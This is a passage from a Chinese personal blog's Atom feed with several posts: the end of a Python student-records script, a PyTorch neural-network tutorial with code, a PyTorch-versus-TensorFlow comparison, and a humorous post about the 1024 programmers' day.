class="hljs-string">'stuid'</span>)) +<span class="hljs-string">'  '</span> +str(self.allstu[s].get(<span class="hljs-string">'stuname'</span>)) + <span class="hljs-string">'  '</span> +str(self.allstu[s].get(<span class="hljs-string">'score'</span>)))</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                print(<span class="hljs-string">"没有此学生相关信息!"</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Output_txt</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        f = open(<span class="hljs-string">"pydata.txt"</span>, <span class="hljs-string">"wt"</span>)</span><br><span class="line">        length = len(self.allstu)</span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(length):</span><br><span class="line">            f.writelines(self.allstu[s] + <span class="hljs-string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Input_txt</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        fw = open(<span class="hljs-string">"pydata.txt"</span>, <span class="hljs-string">"rt"</span>)</span><br><span class="line">        length = len(self.allstu)</span><br><span class="line">        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fw:</span><br><span class="line">            string = fw.readline()</span><br><span class="line">            print(string)</span><br><span class="line">            ts = string</span><br><span class="line">            print(type(ts))</span><br><span class="line">            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(len(self.allstu)):</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (ts.get(<span class="hljs-string">'stuid'</span>) == self.allstu[s].get(<span class="hljs-string">'stuid'</span>)):</span><br><span class="line">                    self.allstu.append(ts)</span><br><span class="line">        print(<span class="hljs-string">"读取成功!"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本程序包含main.py和gro.py两个函数&lt;br&gt;可以使用&lt;strong&gt;python main.py&lt;/strong&gt; 直接运行！&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="学生信息管理系统" scheme="http://yoursite.com/tags/%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>pytorch实现神经网络</title>
    <link href="http://yoursite.com/2019/10/27/pytorch%E5%AE%9E%E7%8E%B0%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2019/10/27/pytorch实现神经网络/</id>
    <published>2019-10-27T09:18:28.000Z</published>
    <updated>2019-10-27T09:22:04.959Z</updated>
    
    <content type="html"><![CDATA[<p>神经网络是通过torch.nn包来构建的</p><a id="more"></a><p>然后我们先看一个神经网络的处理流程：</p><p>1 定义网络架构</p><p>2 将输入喂入神经网络</p><p>3 神经网络计算输入得出输出</p><p>3 对比输出与真实标签数据</p><p>4 计算第3步中输出与真实标签的差距，也就是loss</p><p>5 如果loss太大，就反向传播回去调整网络参数。再重复、2，3，4，知道loss小到我们的要求为止。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> torch</span><br><span class="line"><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn</span><br><span class="line"><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Net</span><span class="hljs-params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="hljs-comment">#定义卷积核 1是输入通道数，6是输出通道数，5是指5×5的卷积</span></span><br><span class="line">        <span class="hljs-comment">#所以类推就是第一个参数是输入通道，第二个是输出通道，第三个是卷积核尺寸</span></span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>)</span><br><span class="line">        <span class="hljs-comment">#定义全连接参数</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="hljs-number">16</span>*<span class="hljs-number">5</span>*<span class="hljs-number">5</span>, <span class="hljs-number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">#定义前向传播</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-comment">#将第一层卷积后的结果放入激活函数relu 再 最大池化一下，（2，2）是池化的步长</span></span><br><span class="line">        x = F.max_pool2d(F.relu(self.conv1(x)), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))</span><br><span class="line">        <span class="hljs-comment">#同上一层一样，不过有一点不一样就是如果x是正方形，也就是长宽都相等的话，步长可以只指定一个数字</span></span><br><span class="line">        x = F.max_pool2d(F.relu(self.conv2(x)), <span class="hljs-number">2</span>)</span><br><span class="line">        <span class="hljs-comment"># 这个是将x变成一维数组，为全连接层做准备</span></span><br><span class="line">        x = x.view(<span class="hljs-number">-1</span>, self.num_flat_features(x))</span><br><span class="line">        <span class="hljs-comment">#全连接层</span></span><br><span class="line">        x = F.relu(self.fc1(x))</span><br><span class="line">        x = F.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="hljs-keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">num_flat_features</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-comment">#第一个维度不要，因为第一个维度是输入数据的batch，batch也就是一次输入多少张图片</span></span><br><span class="line">        size = x.size()[<span class="hljs-number">1</span>:]</span><br><span class="line">        num_features = <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> size:</span><br><span class="line">            num_features*=s</span><br><span class="line">        <span class="hljs-keyword">return</span> num_features</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net = Net()</span><br><span class="line">print(net)</span><br><span class="line"></span><br><span class="line">params = list(net.parameters())</span><br><span class="line"></span><br><span class="line">print(len(params))</span><br><span class="line">print(params[<span class="hljs-number">0</span>].size())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#自定义一个输入32*32的数据</span></span><br><span class="line">input = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>)</span><br><span class="line">out = net(input)</span><br><span class="line">print(out)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#将所有梯度清零，然后反向传播</span></span><br><span class="line">net.zero_grad()</span><br><span class="line">out.backward(torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>))</span><br><span class="line"></span><br><span class="line">output = net(input)</span><br><span class="line">target = torch.randn(<span class="hljs-number">10</span>)  <span class="hljs-comment">#我们定义的真实值</span></span><br><span class="line">target = target.view(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)<span class="hljs-comment">#将真实值的维度改成和输出值的维度</span></span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line"></span><br><span class="line">loss = criterion(output, target)</span><br><span class="line">print(loss)</span><br><span class="line">print(loss.grad_fn)  <span class="hljs-comment"># MSELoss</span></span><br><span class="line">print(loss.grad_fn.next_functions[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])  <span class="hljs-comment"># Linear</span></span><br><span class="line">print(loss.grad_fn.next_functions[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].next_functions[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#清零梯度</span></span><br><span class="line">net.zero_grad()</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'反向传播前第一层参数b'</span>)</span><br><span class="line">print(net.conv1.bias.grad)</span><br><span class="line"></span><br><span class="line">loss.backward()</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'反向传播后第一层参数b'</span>)</span><br><span class="line">print(net.conv1.bias.grad)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">learning_rate = <span class="hljs-number">0.01</span></span><br><span class="line"><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> net.parameters():</span><br><span class="line">    f.data.sub_(f.grad.data * learning_rate)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim</span><br><span class="line"></span><br><span class="line">optimizer = optim.SGD(net.parameters(), lr=<span class="hljs-number">0.01</span>)</span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;神经网络是通过torch.nn包来构建的&lt;/p&gt;
    
    </summary>
    
    
      <category term="AI" scheme="http://yoursite.com/categories/AI/"/>
    
    
      <category term="深度学习" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="pytorch" scheme="http://yoursite.com/tags/pytorch/"/>
    
  </entry>
  
  <entry>
    <title>pytorch与tensorflow两大框架对比</title>
    <link href="http://yoursite.com/2019/10/27/pytorch%E4%B8%8Etensorflow%E4%B8%A4%E5%A4%A7%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/"/>
    <id>http://yoursite.com/2019/10/27/pytorch与tensorflow两大框架对比/</id>
    <published>2019-10-27T08:35:59.000Z</published>
    <updated>2019-10-27T08:57:58.061Z</updated>
    
    <content type="html"><![CDATA[<p>如果你在读这篇文章，那么你可能已经开始了自己的深度学习之旅。如果你对这一领域还不是很熟悉，那么简单来说，深度学习使用了「人工神经网络」，这是一种类似大脑的特殊架构，这个领域的发展目标是开发出能解决真实世界问题的类人计算机。为了帮助开发这些架构，谷歌、Facebook 和 Uber 等科技巨头已经为 Python 深度学习环境发布了多款框架，这让人们可以更轻松地学习、构建和训练不同类型的神经网络。</p><a id="more"></a><p>目录</p><ul><li>谷歌的 TensorFlow</li><li>Facebook 的 PyTorch</li><li>我们可以用 TensorFlow 和 PyTorch 构建什么？</li><li>PyTorch 和 TensorFlow 对比</li><li>PyTorch 和 TensorFlow 的优点和缺点</li><li>PyTorch 和 TensorFlow 安装、版本、更新</li><li>TensorFlow 还是 PyTorch？我的建议</li></ul><h2 id="1-谷歌的-TensorFlow"><a href="#1-谷歌的-TensorFlow" class="headerlink" title="1.谷歌的 TensorFlow"></a>1.谷歌的 TensorFlow</h2><p>TensorFlow 是谷歌的开发者创造的一款开源的深度学习框架，于 2015 年发布。官方研究发布于论文《TensorFlow：异构分布式系统上的大规模机器学习》。</p><p>论文地址：<a href="http://download.tensorflow.org/paper/whitepaper2015.pdf" target="_blank" rel="noopener">http://download.tensorflow.org/paper/whitepaper2015.pdf</a></p><p>TensorFlow 现已被公司、企业与创业公司广泛用于自动化工作任务和开发新系统，其在分布式训练支持、可扩展的生产和部署选项、多种设备（比如安卓）支持方面备受好评。</p><h2 id="2-Facebook-的-PyTorch"><a href="#2-Facebook-的-PyTorch" class="headerlink" title="2.Facebook 的 PyTorch"></a>2.Facebook 的 PyTorch</h2><p>PyTorch 是最新的深度学习框架之一，由 Facebook 的团队开发，并于 2017 年在 GitHub 上开源。有关其开发的更多信息请参阅论文《PyTorch 中的自动微分》。</p><p>论文地址：<a href="https://openreview.net/pdf?id=BJJsrmfCZ" target="_blank" rel="noopener">https://openreview.net/pdf?id=BJJsrmfCZ</a></p><p>PyTorch 很简洁、易于使用、支持动态计算图而且内存使用很高效，因此越来越受欢迎。接下来还会更详细地介绍。</p><h2 id="3-我们可以用-TensorFlow-和-PyTorch-构建什么？"><a href="#3-我们可以用-TensorFlow-和-PyTorch-构建什么？" class="headerlink" title="3.我们可以用 TensorFlow 和 PyTorch 构建什么？"></a>3.我们可以用 TensorFlow 和 PyTorch 构建什么？</h2><p>神经网络起初是被用于解决手写数字识别或用相机识别汽车注册车牌等简单的分类问题。但随着近来框架的发展以及英伟达高计算性能图形处理单元（GPU）的进步，我们可以在 TB 级的数据上训练神经网络并求解远远更加复杂的问题。一个值得提及的成就是在 TensorFlow 和 PyTorch 中实现的卷积神经网络在 ImageNet 上都达到了当前最佳的表现。训练后的模型可以用在不同的应用中，比如目标检测、图像语义分割等等。</p><p>尽管神经网络架构可以基于任何框架实现，但结果却并不一样。训练过程有大量参数都与框架息息相关。举个例子，如果你在 PyTorch 上训练一个数据集，那么你可以使用 GPU 来增强其训练过程，因为它们运行在 CUDA（一种 C++ 后端）上。TensorFlow 也能使用 GPU，但它使用的是自己内置的 GPU 加速。因此，根据你所选框架的不同，训练模型的时间也总是各不相同。</p><p>一、TensorFlow 顶级项目</p><ol><li><p>Magenta：一个探索将机器学习用作创造过程的工具的开源研究项目：<a href="https://magenta.tensorflow.org/" target="_blank" rel="noopener">https://magenta.tensorflow.org/</a></p></li><li><p>Sonnet：这是一个基于 TensorFlow 的软件库，可用于构建复杂的神经网络：<a href="https://sonnet.dev/" target="_blank" rel="noopener">https://sonnet.dev/</a></p></li><li><p>Ludwig：这是一个无需写代码就能训练和测试深度学习模型的工具箱：<a href="https://uber.github.io/ludwig/" target="_blank" rel="noopener">https://uber.github.io/ludwig/</a></p></li></ol><p>二、PyTorch 顶级项目</p><ol><li><p>CheXNet：使用深度学习来分析胸部 X 光照片，能实现放射科医生水平的肺炎监测：<a href="https://stanfordmlgroup.github.io/projects/chexnet/" target="_blank" rel="noopener">https://stanfordmlgroup.github.io/projects/chexnet/</a></p></li><li><p>PYRO：这是一种用 Python 编写的通用概率编程语言（PPL），后端由 PyTorch 支持：<a href="https://pyro.ai" target="_blank" rel="noopener">https://pyro.ai</a> (<a href="https://pyro.ai/" target="_blank" rel="noopener">https://pyro.ai/</a>)</p></li><li><p>Horizon：一个用于应用强化学习（Applied RL）的平台：<a href="https://horizonrl.com" target="_blank" rel="noopener">https://horizonrl.com</a> (<a href="https://horizonrl.com/" target="_blank" rel="noopener">https://horizonrl.com/</a>)</p></li></ol><p>这些只是基于 TensorFlow 和 PyTorch 构建的少量框架和项目。你能在 TensorFlow 和 PyTorch 的 GitHub 和官网上找到更多。</p><h2 id="4-PyTorch-和-TensorFlow-对比"><a href="#4-PyTorch-和-TensorFlow-对比" class="headerlink" title="4.PyTorch 和 TensorFlow 对比"></a>4.PyTorch 和 TensorFlow 对比</h2><p>PyTorch 和 TensorFlow 的关键差异是它们执行代码的方式。这两个框架都基于基础数据类型张量（tensor）而工作。你可以将张量看作是下图所示的多维数组。</p><p><a href="https://imgchr.com/i/Ks4OHK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks4OHK.md.jpg" alt="Ks4OHK.jpg" border="0"></a></p><p><strong>机制：动态图定义与静态图定义</strong></p><p>TensorFlow 框架由两个核心构建模块组成：</p><ul><li>一个用于定义计算图以及在各种不同硬件上执行这些图的运行时间的软件库。</li><li>一个具有许多优点的计算图（后面很快就会介绍这些优点）。</li></ul><p>计算图是一种将计算描述成有向图的抽象方式。图是一种由节点（顶点）和边构成的数据结构，是由有向的边成对连接的顶点的集合。</p><p>当你在 TensorFlow 中运行代码时，计算图是以静态方式定义的。与外部世界的所有通信都是通过 tf.Sessionobject 和 tf.Placeholder 执行，它们是在运行时会被外部数据替换的张量。例如，看看以下代码段：</p><p><a href="https://imgchr.com/i/Ks5S9H" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5S9H.md.jpg" alt="Ks5S9H.jpg" border="0"></a></p><p>下图是 TensorFlow 中运行代码之前以静态方式生成计算图的方式。计算图的核心优势是能实现并行化或依赖驱动式调度（dependency driving scheduling），这能让训练速度更快，更有效率。</p><p><a href="https://imgchr.com/i/Ks59gA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks59gA.md.jpg" alt="Ks59gA.jpg" border="0"></a></p><p>类似于 TensorFlow，PyTorch 也有两个核心模块：</p><ul><li>计算图的按需和动态构建</li><li>Autograd：执行动态图的自动微分</li></ul><p>可以在下图中看到，图会随着执行过程而改变和执行节点，没有特殊的会话接口或占位符。整体而言，这个框架与 Python 语言的整合更紧密，大多数时候感觉更本地化。因此，PyTorch 是更 Python 化的框架，而 TensorFlow 则感觉完全是一种新语言。</p><p><a href="https://imgchr.com/i/Ks5CjI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5CjI.md.jpg" alt="Ks5CjI.jpg" border="0"></a></p><p>根据你所用的框架，在软件领域有很大的不同。TensorFlow 提供了使用 TensorFlow Fold 库实现动态图的方式，而 PyTorch 的动态图是内置的。</p><p><strong>分布式训练</strong></p><p>PyTorch 和 TensorFlow 的一个主要差异特点是数据并行化。PyTorch 优化性能的方式是利用 Python 对异步执行的本地支持。而用 TensorFlow 时，你必须手动编写代码，并微调要在特定设备上运行的每个操作，以实现分布式训练。但是，你可以将 PyTorch 中的所有功能都复现到 TensorFlow 中，但这需要做很多工作。下面的代码片段展示了用 PyTorch 为模型实现分布式训练的简单示例：</p><p><a href="https://imgchr.com/i/Ks5Z4g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5Z4g.md.jpg" alt="Ks5Z4g.jpg" border="0"></a></p><p><strong>可视化</strong></p><p>在训练过程的可视化方面，TensorFlow 更有优势。可视化能帮助开发者跟踪训练过程以及实现更方便的调试。TensorFlow 的可视化库名为 TensorBoard。PyTorch 开发者则使用 Visdom，但是 Visdom 提供的功能很简单且有限，所以 TensorBoard 在训练过程可视化方面更好。</p><p>TensorBoard 的特性：</p><ul><li>跟踪和可视化损失和准确度等指标</li><li>可视化计算图（操作和层）</li><li>查看权重、偏差或其它张量随时间变化的直方图</li><li>展示图像、文本和音频数据</li><li>分析 TensorFlow 程序</li></ul><p><a href="https://imgchr.com/i/Ks5Quq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5Quq.md.jpg" alt="Ks5Quq.jpg" border="0"></a></p><p>Visdom 的特性</p><ul><li>处理回调</li><li>绘制图表和细节</li><li>管理环境</li></ul><p><a href="https://imgchr.com/i/Ks51bV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks51bV.md.jpg" alt="Ks51bV.jpg" border="0"></a></p><p><strong>生产部署</strong></p><p>在将训练好的模型部署到生产方面，TensorFlow 显然是赢家。我们可以直接使用 TensorFlow serving 在 TensorFlow 中部署模型，这是一种使用了 REST Client API 的框架。</p><p>使用 PyTorch 时，在最新的 1.0 稳定版中，生产部署要容易一些，但它没有提供任何用于在网络上直接部署模型的框架。你必须使用 Flask 或 Django 作为后端服务器。所以，如果要考虑性能，TensorFlow serving 可能是更好的选择。</p><p><strong>用 PyTorch 和 TensorFlow 定义一个简单的神经网络</strong></p><p>我们比较一下如何在 PyTorch 和 TensorFlow 中声明神经网络。</p><p>在 PyTorch 中，神经网络是一个类，我们可以使用 torch.nn 软件包导入构建架构所必需的层。所有的层都首先在 <strong>init</strong>() 方法中声明，然后在 forward() 方法中定义输入 x 在网络所有层中的遍历方式。最后，我们声明一个变量模型并将其分配给定义的架构（model = NeuralNet()）。</p><p><a href="https://imgchr.com/i/Ks5avR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5avR.md.jpg" alt="Ks5avR.jpg" border="0"></a></p><p>近期 Keras 被合并到了 TensorFlow 库中，这是一个使用 TensorFlow 作为后端的神经网络框架。从那时起，在 TensorFlow 中声明层的句法就与 Keras 的句法类似了。首先，我们声明变量并将其分配给我们将要声明的架构类型，这里的例子是一个 Sequential() 架构。</p><p>接下来，我们使用 model.add() 方法以序列方式直接添加层。层的类型可以从 tf.layers 导入，如下代码片段所示：</p><p><a href="https://imgchr.com/i/Ks5cPe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/Ks5cPe.md.jpg" alt="Ks5cPe.jpg" border="0"></a></p><h2 id="5-TensorFlow-和-PyTorch-的优缺点"><a href="#5-TensorFlow-和-PyTorch-的优缺点" class="headerlink" title="5.TensorFlow 和 PyTorch 的优缺点"></a>5.TensorFlow 和 PyTorch 的优缺点</h2><p>TensorFlow和PyTorch各有其优缺点。</p><p>TensorFlow 的优点：</p><ul><li>简单的内置高级 API</li><li>使用 TensorBoard 可视化训练</li><li>通过 TensorFlow serving 容易实现生产部署</li><li>很容易的移动平台支持</li><li>开源</li><li>良好的文档和社区支持</li></ul><p>TensorFlow 的缺点：</p><ul><li>静态图</li><li>调试方法</li><li>难以快速修改</li></ul><p>PyTorch 的优点</p><ul><li>类 Python 的代码</li><li>动态图</li><li>轻松快速的编辑</li><li>良好的文档和社区支持</li><li>开源</li><li>很多项目都使用 PyTorch</li></ul><p>PyTorch 的缺点：</p><ul><li>可视化需要第三方</li><li>生产部署需要 API 服务器</li></ul><h2 id="6-PyTorch-和-TensorFlow-安装、版本、更新"><a href="#6-PyTorch-和-TensorFlow-安装、版本、更新" class="headerlink" title="6.PyTorch 和 TensorFlow 安装、版本、更新"></a>6.PyTorch 和 TensorFlow 安装、版本、更新</h2><p>具体看我的另外一篇文章：:point_right: <a href="https://uppez.github.io/2019/09/15/%E4%B8%BAAnaconda3%E5%AE%89%E8%A3%85tensorflow%E7%AD%89/#more" target="_blank" rel="noopener">Anaconda3安装tf/pytorch/keras</a></p><h2 id="7-TensorFlow-还是-PyTorch？"><a href="#7-TensorFlow-还是-PyTorch？" class="headerlink" title="7.TensorFlow 还是 PyTorch？"></a>7.TensorFlow 还是 PyTorch？</h2><blockquote><p>TensorFlow 是一种非常强大和成熟的深度学习库，具有很强的可视化功能和多个用于高级模型开发的选项。它有面向生产部署的选项，并且支持移动平台。另一方面，PyTorch 框架还很年轻，拥有更强的社区动员，而且它对 Python 友好。<br> 我的建议是如果你想更快速地开发和构建 AI 相关产品，TensorFlow 是很好的选择。建议研究型开发者使用 PyTorch，因为它支持快速和动态的训练。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果你在读这篇文章，那么你可能已经开始了自己的深度学习之旅。如果你对这一领域还不是很熟悉，那么简单来说，深度学习使用了「人工神经网络」，这是一种类似大脑的特殊架构，这个领域的发展目标是开发出能解决真实世界问题的类人计算机。为了帮助开发这些架构，谷歌、Facebook 和 Uber 等科技巨头已经为 Python 深度学习环境发布了多款框架，这让人们可以更轻松地学习、构建和训练不同类型的神经网络。&lt;/p&gt;
    
    </summary>
    
    
      <category term="AI" scheme="http://yoursite.com/categories/AI/"/>
    
    
      <category term="深度学习框架" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>1024节日快乐</title>
    <link href="http://yoursite.com/2019/10/24/1024%E8%8A%82%E6%97%A5%E5%BF%AB%E4%B9%90/"/>
    <id>http://yoursite.com/2019/10/24/1024节日快乐/</id>
    <published>2019-10-24T12:31:55.000Z</published>
    <updated>2019-10-24T12:48:02.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1024程序猿节日来源"><a href="#1024程序猿节日来源" class="headerlink" title="1024程序猿节日来源"></a>1024程序猿节日来源</h1><p>1024 是 2 的 10 次方，常用于存储空间的定义：1M = 1024K 。程序员就像是一个个 1024，以最低调、踏实、核心的功能模块搭建起这个科技世界。1G=1024M，而 1G 与 1 级谐音，也有一级棒的意思。<br>从 2015 年起，每年 10 月 24 日被定义为程序员节。向通过 Coding 改变世界，追求技术知识创新的程序员们致敬。</p><a id="more"></a><p>结果呢？随着 IT 行业高收入，大家对程序员越来越关注，都以为程序员是：</p><img src="https://s2.ax1x.com/2019/10/24/KaSl4O.jpg" alt="别人眼中的他们" border="0"><p>而实际上他们是：</p><img src="https://s2.ax1x.com/2019/10/24/KaSQUK.jpg" alt="他们眼中的自己" border="0"><p>“多金”也是程序员的重要标签<br>根据饿了么与挖财发布的<br>《互联网从业者生活品质报告》统计<br>10%程序员的年收入高于50万<br>有近5成的程序员年薪在20万以上</p><img src="https://s2.ax1x.com/2019/10/24/KaSJvd.jpg" alt="KaSJvd.jpg" border="0"><p>还有很多人说程序员木讷、不解风情<br>其实是你不懂程序员的浪漫<br>95后程序员韦若琛曾错过常人眼中的“520”，选择在5月22日表白，因为在他头脑里，5×16×16+2×16+2=1282+32=1314，522是16进制的1314，是黑客情人节。<br>正所谓“程序员浪起漫来，真没你啥事了”<br>看看下面这串代码感受一下</p><img src="https://s2.ax1x.com/2019/10/24/KapJiT.gif" alt="KapJiT.gif" border="0"><p>如今，在父母们眼里<br>程序员高收入、工作稳定、老实不容易出轨<br>俨然成了相亲市场上的“抢手货”<br>就在去年阿里巴巴举办的开发者大会上<br>有位家长就到现场为女儿张贴了征婚启示<br>指定要“程序员”</p><p>曾有打油诗如此形容程序员这一职业<br>“十年编程两茫茫，工期短，需求长。<br>千行代码，Bug 何处藏。<br>纵使上线又如何，新版本，继续忙。<br>黑白颠倒没商量，睡地铺，吃食堂。<br>夜半梦醒，无人在身旁。<br>最怕灯火阑珊时，手机响，心里慌。”</p><img src="https://s2.ax1x.com/2019/10/24/KaSGgH.jpg" alt="KaSGgH.jpg" border="0"><h1 id="未来可期"><a href="#未来可期" class="headerlink" title="未来可期"></a>未来可期</h1><img src="https://s2.ax1x.com/2019/10/24/KaS88e.jpg" alt="KaS88e.jpg" border="0"><p>程序员之歌<br>在那山的那边海的那边有一群程序猿<br>他们老实又腼腆<br>他们聪明又有钱<br>他们一天到晚坐在那里认真地改bug<br>他们饿了就吃一口方便面<br>噢~<br>可爱的程序员~<br>可爱的程序员~<br>只要一提需求他们就要重新改一遍<br>可是时间只剩下最后一天</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1024程序猿节日来源&quot;&gt;&lt;a href=&quot;#1024程序猿节日来源&quot; class=&quot;headerlink&quot; title=&quot;1024程序猿节日来源&quot;&gt;&lt;/a&gt;1024程序猿节日来源&lt;/h1&gt;&lt;p&gt;1024 是 2 的 10 次方，常用于存储空间的定义：1M = 1024K 。程序员就像是一个个 1024，以最低调、踏实、核心的功能模块搭建起这个科技世界。1G=1024M，而 1G 与 1 级谐音，也有一级棒的意思。&lt;br&gt;从 2015 年起，每年 10 月 24 日被定义为程序员节。向通过 Coding 改变世界，追求技术知识创新的程序员们致敬。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="1024快乐" scheme="http://yoursite.com/tags/1024%E5%BF%AB%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>pytorch的基石-tensor张量</title>
    <link href="http://yoursite.com/2019/10/23/pytorch%E7%9A%84%E5%9F%BA%E7%9F%B3-tensor%E5%BC%A0%E9%87%8F/"/>
    <id>http://yoursite.com/2019/10/23/pytorch的基石-tensor张量/</id>
    <published>2019-10-23T12:31:17.000Z</published>
